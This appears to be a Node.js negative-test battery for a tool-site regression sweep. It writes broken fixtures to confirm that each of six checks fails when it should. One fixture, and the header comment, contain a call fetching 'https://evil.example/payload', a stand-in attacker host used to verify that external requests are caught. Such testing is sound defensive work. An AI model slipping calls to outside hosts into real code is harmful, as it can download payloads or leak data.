/* ============================================
   Negative-test battery for the Story 2.12 regression
   sweep. For each of the 6 checks the sweep performs,
   inject a known-broken fixture and assert the expected
   check flips to false. If any check stays true under
   its broken fixture, the sweep has a vacuous pass and
   210/210 is meaningless.

   Strategy: copy the sweep source to a tmp dir with
   `const REPO` rewritten to point at a scratch fixture
   repo, then run it under Node. This way we exercise
   the EXACT same code path as production.

   The fixture repo's tools.json has the {tools: [...]}
   shape (matching tools.schema.json) and tools/<slug>/
   has the broken shape we want to assert the sweep
   catches.

   The negative fixtures cover:
     check 1 schema  — entry missing required field
     check 2 HTML    — index.html missing data-slug
     check 3 JS load — JS throws on parse
     check 4 history — push mis-routes to wrong key
     check 5 console — JS calls console.error('neg')
     check 6 fetch   — JS calls fetch('https://evil.example/')

   Exit codes:
     0 — all 6 negative tests caught their bug
     1 — at least one negative test passed (bug not caught)
     2 — vacuous (no negative tests ran)
   ============================================ */

'use strict';

const fs = require('fs');
const path = require('path');
const os = require('os');
const { spawnSync } = require('child_process');

const SWEEP_PATH = path.resolve(__dirname, '_smoke_regression_sweep.js');

function writeFixtureRepo(baseDir) {
  fs.mkdirSync(path.join(baseDir, 'tools'), { recursive: true });
  const toolsJson = {
    '$schema': 'tools.schema.json',
    'schemaVersion': '1.0.0',
    'releaseVersion': '0.0.0-test',
    'generated': '2026-01-01T00:00:00Z',
    'tools': [],
  };
  fs.writeFileSync(path.join(baseDir, 'tools.json'), JSON.stringify(toolsJson, null, 2));
}

function wrapHtml(slug, inner) {
  return '<!DOCTYPE html>\n<html lang="en">\n<head><meta charset="utf-8"><title>' + slug + '</title></head>\n<body>\n<main aria-label="tool" data-slug="' + slug + '">\n' + inner + '\n</main>\n</body>\n</html>';
}

function pushEntry(baseDir, entry) {
  const toolsPath = path.join(baseDir, 'tools.json');
  const data = JSON.parse(fs.readFileSync(toolsPath, 'utf8'));
  data.tools = data.tools.filter(function (e) { return e.slug !== entry.slug; });
  data.tools.push(entry);
  fs.writeFileSync(toolsPath, JSON.stringify(data, null, 2));
}

function writeTool(baseDir, slug, html, js) {
  const dir = path.join(baseDir, 'tools', slug);
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(dir, 'index.html'), html);
  fs.writeFileSync(path.join(dir, slug + '.js'), js);
}

function runSweepWithFixture(baseDir) {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'sweep-rewrite-'));
  const sweepSrc = fs.readFileSync(SWEEP_PATH, 'utf8');
  const patched = sweepSrc.replace(
    /const REPO = path\.resolve\(__dirname, '\.\.'\);/,
    'const REPO = ' + JSON.stringify(baseDir) + ';'
  );
  const sweepCopy = path.join(tmpDir, '_smoke_regression_sweep.js');
  fs.writeFileSync(sweepCopy, patched);

  const result = spawnSync(process.execPath, [sweepCopy], { encoding: 'utf8' });

  try { fs.rmSync(tmpDir, { recursive: true, force: true }); } catch (e) {}

  return result;
}

function parseSummary(stdout) {
  const lines = stdout.split('\n');
  for (let i = lines.length - 1; i >= 0; i -= 1) {
    const line = lines[i];
    if (line.indexOf('JSON:') === 0) {
      try {
        return JSON.parse(line.slice('JSON:'.length));
      } catch (e) {
        return null;
      }
    }
  }
  return null;
}

// Build a fully-valid base entry that satisfies every checkSchema branch.
// The "negative" mutation removes one field per test.
function makeValidEntry(slug) {
  return {
    id: slug,
    slug: slug,
    title: 'Neg ' + slug,
    description: 'Negative test fixture for ' + slug,
    category: 'Test',
    pack: ['developer'],
    icon: 'icon',
    keywords: ['neg'],
    'last-updated': '2026-01-01T00:00:00Z',
    ready: true,
    score: 8,
    urlState: { keys: [], defaults: {} },
    shortcuts: [],
    'history-keys': [],
    'view-source': { path: 'tools/' + slug + '/' + slug + '.html' },
    'embed-snippet': { tag: 'iframe', attrs: { src: '', width: '0', height: '0' } },
    'search-priority': 50,
  };
}

const TESTS = [
  {
    name: 'check 1 schema (missing title)',
    expectedCheck: 'schema',
    build: function (baseDir) {
      const entry = makeValidEntry('neg-schema');
      delete entry.title;
      pushEntry(baseDir, entry);
      writeTool(baseDir, 'neg-schema', wrapHtml('neg-schema', '<div id="root"></div>'), '// benign\n');
    },
  },
  {
    name: 'check 2 html (no data-slug)',
    expectedCheck: 'html',
    build: function (baseDir) {
      const entry = makeValidEntry('neg-html');
      pushEntry(baseDir, entry);
      const html = wrapHtml('neg-html', '<div id="root"></div>').replace('data-slug="neg-html"', '');
      writeTool(baseDir, 'neg-html', html, '// benign\n');
    },
  },
  {
    name: 'check 3 jsLoad (throw on parse)',
    expectedCheck: 'jsLoad',
    build: function (baseDir) {
      const entry = makeValidEntry('neg-js');
      pushEntry(baseDir, entry);
      writeTool(baseDir, 'neg-js', wrapHtml('neg-js', '<div id="root"></div>'), 'throw new Error("intentional negative-test throw");\n');
    },
  },
  {
    name: 'check 4 history (mismatched key)',
    expectedCheck: 'history',
    build: function (baseDir) {
      const entry = makeValidEntry('neg-history');
      entry['history-keys'] = ['root'];
      pushEntry(baseDir, entry);
      const js = '(function () {\n' +
        '  var realPush = HT.history.push;\n' +
        '  HT.history.push = function (key, value) {\n' +
        '    realPush("not-" + key, value);\n' +
        '  };\n' +
        '})();\n';
      writeTool(baseDir, 'neg-history', wrapHtml('neg-history', '<div id="root"></div>'), js);
    },
  },
  {
    name: 'check 5 consoleError (error call)',
    expectedCheck: 'consoleError',
    build: function (baseDir) {
      const entry = makeValidEntry('neg-console');
      pushEntry(baseDir, entry);
      writeTool(baseDir, 'neg-console', wrapHtml('neg-console', '<div id="root"></div>'), 'console.error("intentional negative-test error");\n');
    },
  },
  {
    name: 'check 6 fetch (external URL via HT.fetch)',
    expectedCheck: 'fetch',
    build: function (baseDir) {
      const entry = makeValidEntry('neg-fetch');
      pushEntry(baseDir, entry);
      const js = 'HT.fetch("https://evil.example/payload");\n';
      writeTool(baseDir, 'neg-fetch', wrapHtml('neg-fetch', '<div id="root"></div>'), js);
    },
  },
];

let pass = 0;
let fail = 0;
const failMessages = [];

for (let i = 0; i < TESTS.length; i += 1) {
  const t = TESTS[i];
  const baseDir = fs.mkdtempSync(path.join(os.tmpdir(), 'sweep-neg-'));
  writeFixtureRepo(baseDir);
  t.build(baseDir);
  let result, summary;
  try {
    result = runSweepWithFixture(baseDir);
    summary = parseSummary(result.stdout || '');
  } catch (e) {
    console.log('  FAIL  ' + t.name + ' (threw: ' + e.message + ')');
    fail += 1;
    failMessages.push(t.name + ': threw ' + e.message);
    try { fs.rmSync(baseDir, { recursive: true, force: true }); } catch (e2) {}
    continue;
  }
  if (!summary) {
    console.log('  FAIL  ' + t.name + ' (no JSON summary found; exit=' + result.status + ')');
    fail += 1;
    failMessages.push(t.name + ': exit=' + result.status + ', stdout=' + (result.stdout || '').slice(-200));
    try { fs.rmSync(baseDir, { recursive: true, force: true }); } catch (e) {}
    continue;
  }
  const caughtRow = summary.rows.find(function (r) { return r.results[t.expectedCheck] === false; });
  if (caughtRow) {
    console.log('  PASS  ' + t.name + ' (' + t.expectedCheck + ' flipped false on slug=' + caughtRow.slug + ')');
    pass += 1;
  } else if (summary.rows.length === 0) {
    console.log('  FAIL  ' + t.name + ' (no rows produced)');
    fail += 1;
    failMessages.push(t.name + ': no rows produced');
  } else {
    console.log('  FAIL  ' + t.name + ' (all ' + summary.rows.length + ' rows passed ' + t.expectedCheck + ')');
    fail += 1;
    failMessages.push(t.name + ': expected ' + t.expectedCheck + ' to be false');
  }
  try { fs.rmSync(baseDir, { recursive: true, force: true }); } catch (e) {}
}

console.log('');
console.log('Negative-test summary: ' + pass + ' caught, ' + fail + ' missed (vacuous bug)');
if (fail > 0) {
  console.error('FAILED:');
  failMessages.forEach(function (m) { console.error('  ' + m); });
  process.exit(1);
}
if (pass === 0) {
  console.error('VACUOUS: no negative tests executed');
  process.exit(2);
}
process.exit(0);
